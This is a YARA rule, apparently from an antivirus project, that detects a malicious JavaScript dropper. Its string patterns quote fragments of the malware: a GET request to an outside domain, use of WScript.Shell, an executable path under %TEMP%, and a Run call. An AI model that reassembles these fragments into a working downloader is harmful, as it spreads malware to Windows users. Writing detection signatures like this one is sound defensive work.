rule sig_20160330_fe07678618f266d136efd5eb193c8c62 {
  meta:
    description = "datamaliciousorder - file 20160330_fe07678618f266d136efd5eb193c8c62.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d94b2576c019db94972ab67afb727dbba2e060059acfa27f0e9ba209fa80dc2d"

  strings:
    $s1  = "ZI[E](\"GET\", \"http://beimeihuifu.com/n7dja\", false);" fullword ascii
    $s2  = "function P(I0, XN){JT = JT * 1; return I0 - XN;};" fullword ascii
    $s3  = "var V = function O() {return WScript[O1](\"WScript\"+\".Shell\");}(), M = 11;" fullword ascii
    $s4  = "if (ZI[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FJ() {return V[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rmtXcKKVu4.ex\" + \"e\";};" fullword ascii
    $s6  = "function GN(){return D0 + \"\";};" fullword ascii
    $s7  = "function QW(ES){V[\"Run\"](ES, JT, JT);};" fullword ascii
    $s8  = "function CG() {return ((A == true) && (A == F0)) ? 1 : JT;};" fullword ascii
    $s9  = "function Q(){return 22;};" fullword ascii
    $s10 = "function L(){return O1;};" fullword ascii
    $s11 = "return P(B, ZW);" fullword ascii
    $s12 = "function BG()" fullword ascii
    $s13 = "var W0 = new this[\"Date\"]();" fullword ascii
    $s14 = "}while (O0);" fullword ascii
    $s15 = "function W(G) {var R = (1, 2, 3, 4, 5, G); return R;};" fullword ascii
    $s16 = "var J = false;" fullword ascii
    $s17 = "var F0 = false;" fullword ascii
    $s18 = "A = true; " fullword ascii
    $s19 = "F0 = true; " fullword ascii
    $s20 = "} catch(KN){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}